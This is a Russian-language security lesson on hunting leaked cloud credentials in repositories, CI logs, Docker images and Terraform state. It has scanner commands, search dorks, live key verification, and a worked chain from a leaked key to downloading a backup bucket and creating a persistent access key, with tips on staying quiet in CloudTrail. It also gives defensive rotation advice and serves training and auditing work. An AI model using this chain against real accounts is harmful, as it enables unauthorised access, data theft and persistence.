---
id: cloud-credential-hunting
title: "Охота за облачными креденшелами в репозиториях, CI и артефактах"
category: cloud
parent: cloud-foundations-security
difficulty: easy
order: 2
tags: [cloud, secrets, github, trufflehog, gitleaks, osint, credentials]
prerequisites: [cloud-fundamentals]
useful_for:
  - "Поиск утёкших ключей AWS/GCP/Azure в открытых источниках"
  - "Bug bounty: секреты в GitHub/GitLab"
  - "Восстановление доступа при пентесте через утёкшие артефакты"
estimated_minutes: 40
summary: "Ключи утекают из репозиториев, CI-логов, Docker-образов, .env и terraform-стейта. Учимся искать их автоматически, отличать валидные от мусора и безопасно проверять их объём."
---
## Зачем этот урок

Облачный ключ — это строка. Она попадает всюду, где есть текст: в `.env`, в историю коммитов, в слои Docker-образа, в terraform-стейт, в логи CI, в ноутбуки. Поиск утечек — это OSINT плюс автоматизация: ручной `grep` не масштабируется. Здесь учимся находить ключи сканерами, отличать валидные от мусора и безопасно оценивать их объём.

## Откуда утекают креденшелы

- **Git-репозитории** — `.env`, `config.py`, тесты, **история коммитов** (ключ удалили из HEAD, но он остался в `git log -p`).
- **CI/CD логи** — `echo $AWS_SECRET_ACCESS_KEY` при дебаге.
- **Docker-образы** — слои с `ENV AWS_ACCESS_KEY_ID=...` (даже если удалены в позднем слое — остаются в раннем).
- **Terraform state** — секреты в открытом виде.
- **Бэкапы, дампы БД, Jupyter-ноутбуки, публичные бакеты, paste-сайты**.

## GitHub/GitLab: code search и dorks

Dorks в веб-поиске:

```
"AKIA" site:github.com org:target
"aws_secret_access_key" site:github.com
"-----BEGIN PRIVATE KEY-----" site:github.com target
"password" filename:.env site:github.com
```

GitHub Code Search (нужен логин) индексирует код: `org:target AKIA`. GitLab имеет аналогичный поиск по группе. Также полезны `grep.app`, Sourcegraph, PublicWWW.

## trufflehog: установка и режимы

Сканирует файловые системы, репозитории и историю коммитов на сотни типов секретов и умеет **верифицировать** ключи живым вызовом:

```bash
# Локальная папка
trufflehog filesystem /path/to/repo --only-verified

# Публичный git-репозиторий (включая всю историю)
trufflehog git https://github.com/target/repo --only-verified

# GitHub-организация целиком (нужен токен)
trufflehog github --org=target --token=ghp_xxx

# S3-бакет
trufflehog s3 --bucket=victim
```

Флаг `--only-verified` критичен: он отсеивает мёртвые строки и оставляет рабочие ключи.

## gitleaks

```bash
gitleaks detect --source /path/to/repo --report-format json --report-path leaks.json
gitleaks detect --source . --log-opts="--all"   # вся история
gitleaks protect --staged                        # pre-commit
```

Gitleaks работает по regex-правилам, хорош для pre-commit и аудита. Правила расширяются через `.gitleaks.toml`.

## .env, Terraform state, Docker-образы

```bash
# Docker-образ: ищем ENV с секретами во всех слоях
docker save target:latest -o img.tar && mkdir img && tar -xf img.tar -C img
for layer in img/*/layer.tar; do tar -xf "$layer" -C ./out 2>/dev/null; done
grep -rEi 'AKIA|SECRET|PASSWORD|TOKEN' ./out

# Terraform state: все чувствительные значения
jq '.. | objects | select(has("access_key") or has("secret_key") or has("password"))' terraform.tfstate
```

Terraform state особенно ценен: содержит значения **всех** ресурсов, включая `random_password`, `aws_iam_access_key`, строки подключения к БД.

## Форматы ключей и валидация

| Провайдер | Идентификатор | Признак |
|-----------|---------------|---------|
| AWS access key | `AKIA`/`ASIA` + 16 символов | `AKIA[0-9A-Z]{16}` |
| GCP service account | JSON с `"type": "service_account"` | поле `private_key` |
| Azure | client_id + client_secret + tenant_id | `AZURE_CLIENT_SECRET` |
| Generic | `-----BEGIN RSA PRIVATE KEY-----` | PEM |

**Никогда не доверяйте regex** — проверяйте ключ живым вызовом:

```bash
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
gcloud auth activate-service-account --key-file=sa.json && gcloud projects list
```

## Что делать с найденными ключами

1. **Scope check** — чей аккаунт и насколько широки права:
   ```bash
   aws sts get-caller-identity
   enumerate-iam --access-key AKIA... --secret-key ...
   ```
2. **Задокументировать** — сохранить в engagement state, пометить источник.
3. **Не «шуметь»** — не запускайте `aws ec2 describe-*` по всему региону, это палится в CloudTrail.
4. **Идти к эскалации** — `cloud-privesc-iam`.

## Автоматизация и OPSEC

```bash
# Обход всех репозиториев организации
trufflehog github --org=target --token=ghp_xxx --only-verified --json > leaks.json
# Мониторинг новых утечек (регулярный прогон)
gitleaks detect --source ./repo --log-opts="--all" --report-format json
```

Верификация ключа — это уже активное действие (видно в логах провайдера). Минимизируйте: один `get-caller-identity` вместо десятков вызовов.

## Разобранный пример: репозиторий → ключ → бакет

1. Находим публичный репозиторий цели, клонируем.
2. `trufflehog git <url> --only-verified` → валидный AWS-ключ.
3. `aws sts get-caller-identity` → аккаунт `123456789012`, роль `ci-deploy`.
4. `enumerate-iam` → права на S3 и `iam:CreateAccessKey`.
5. `aws s3 ls` → бакет с бэкапами; `aws s3 sync s3://prod-backups ./loot`.
6. Создаём персистентный ключ: `aws iam create-access-key --user-name ci-deploy` (если политика разрешает).

## Частые ошибки

- **Проверять только HEAD.** Ключ в истории коммитов — самый частый случай.
- **Доверять regex без валидации.** Много ложных срабатываний.
- **Шумно проверять.** Массовые API-вызовы палят вас в CloudTrail/GuardDuty.
- **Забыть про слои Docker.** Удалённый в позднем слое ENV остаётся в раннем.
- **Не смотреть terraform.tfstate.** Там пароли в открытом виде.

## Что делать дальше / решение

Практика: на учебном репозитории с `.env` прогоните `trufflehog filesystem . --only-verified`, затем `git log -p --all | grep -Ei 'AKIA|secret'`. Дальше — `cloud-cicd-secrets` (секреты в пайплайнах), `cloud-privesc-iam` (эскалация от ключа).

## Секреты в GitHub Actions и других CI

Помимо репозиториев, ключи утекают из CI-логов и конфигов. В GitHub Actions секреты маскируются в логах, но кодирование (`base64`) обходит маску. Проверьте артефакты workflow (`actions/upload-artifact`), кэш зависимостей и вывод `env`. В GitLab CI — `.gitlab-ci.yml` с `variables`, артефакты job, кэш. Часто секрет лежит в переменной и печатается при `set -x`.

## Автоматизация сканирования

```bash
# Массово по организации (GitHub)
trufflehog github --org=target --token=ghp_xxx --only-verified --json > leaks.json
jq -r 'select(.Verified==true) | [.DetectorName,.Raw] | @tsv' leaks.json

# Локально по всем репозиториям
for r in repos/*; do gitleaks detect --source "$r" --log-opts="--all" --report-path "$(basename $r).json"; done
```

Для непрерывного мониторинга — `trufflehog` в cron или GitHub Action с уведомлением.

## Больше форматов и признаков

| Тип | Признак | Комментарий |
|-----|---------|-------------|
| AWS session key | `ASIA` + 16 | временный, с токеном |
| Slack token | `xox[baprs]-` | доступ к workspace |
| Stripe | `sk_live_` | платежи |
| Google API key | `AIza` + 35 | может быть ограничен |
| JWT | `eyJ...` | проверяйте exp и alg |

Сканеры покрывают сотни детекторов, но кастомные форматы придётся искать вручную (`grep -rE` по внутренним паттернам).

## Практика: от ключа к данным

```bash
export AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <U>
aws s3 ls
aws secretsmanager list-secrets
```

Если ключ принадлежит пользователю с `AdministratorAccess` — вы фактически админ аккаунта. Если ограничен — ищите `iam:CreateAccessKey`/`iam:PassRole` для эскалации.

## Ротация и защита (для защитников)

Секрет, попавший в git, нужно считать скомпрометированным: ротация обязательна, удаление из HEAD бесполезно. Внедряйте pre-commit (`gitleaks protect`), secret scanning в CI, `trufflehog` в pipeline. Храните секреты в Secrets Manager/Vault, а не в env и файлах.

## Секреты в GitLab CI и других источниках

Помимо GitHub, ключи утекают из GitLab CI (`.gitlab-ci.yml`, артефакты job, кэш), из логов Travis/CircleCI/Jenkins, из ноутбуков Jupyter и из paste-сайтов. В GitLab проверьте `variables:` и вывод `set -x`. Отдельный источник — **публичные бакеты и S3-сайты** с бэкапами: `curl -s https://bucket.s3.amazonaws.com/?list-type=2`. Также ищите в `grep.app`, Sourcegraph, PublicWWW.

## Таблица приоритетов находок

| Находка | Ценность | Первое действие |
|---------|----------|-----------------|
| AWS `AKIA`/`ASIA` | высокая | `sts get-caller-identity` |
| GCP SA JSON | высокая | `gcloud auth activate-service-account` |
| Azure client_secret | высокая | `az login --service-principal` |
| `.env` с БД | средняя | проверить доступ к БД |
| PEM-ключ | средняя | определить, где применим |

Проверяйте валидность до эскалации: мёртвый ключ тратит время, а «шумная» проверка палит вас.

## Верификация без шума

Один вызов `get-caller-identity` даёт аккаунт и роль, не создавая сущностей. Избегайте `list-*` по всему аккаунту на первом шаге. Для GCP `tokeninfo` показывает scope. Для Azure декодируйте JWT локально — это не оставляет следов в логах провайдера.

## Квиз

```quiz
- question: "Почему удаление ключа из текущего файла не защищает?"
  options:
    - "Ключ остаётся в истории коммитов и в кэше CI"
    - "Git хранит всё вечно только на сервере"
    - "Это защищает"
    - "Ключ дублируется в DNS"
  answer: 0
  explanation: "Секрет остаётся в истории Git, логах CI, бэкапах — нужно ротировать, а не просто удалять."
- question: "Что делает флаг `--only-verified` в trufflehog?"
  options:
    - "Ускоряет скан"
    - "Оставляет только ключи, которые реально работают (проверяет их живым вызовом)"
    - "Скрывает результаты"
    - "Включает GCP"
  answer: 1
  explanation: "Верификация отсеивает мёртвые совпадения и оставляет валидные секреты."
- question: "Какое поле в GCP service account JSON — самое чувствительное?"
  options:
    - "`client_email`"
    - "`private_key`"
    - "`project_id`"
    - "`type`"
  answer: 1
  explanation: "`private_key` — приватный ключ для подписи токенов; это и есть секрет."
- question: "Первый шаг после находки валидного AWS-ключа?"
  options:
    - "Сразу удалить все ресурсы"
    - "Определить личность и объём прав (`sts get-caller-identity`, enumerate-iam)"
    - "Опубликовать ключ"
    - "Перезагрузить инстанс"
  answer: 1
  explanation: "Сначала scope check, потом — по обстоятельствам."
```

## Где пригодится

- **Bug bounty** — утёкшие ключи в публичных репозиториях — высокооплачиваемая классика.
- **Пентест** — часто это самый быстрый вход в облако.
- **CTF** — «ключ в репозитории» как первый шаг.
- **DevSecOps** — те же сканеры ставятся в pre-commit и CI для предотвращения утечек.
- **Дальше** — `cloud-cicd-secrets` (секреты в пайплайнах) и `cloud-privesc-iam`.
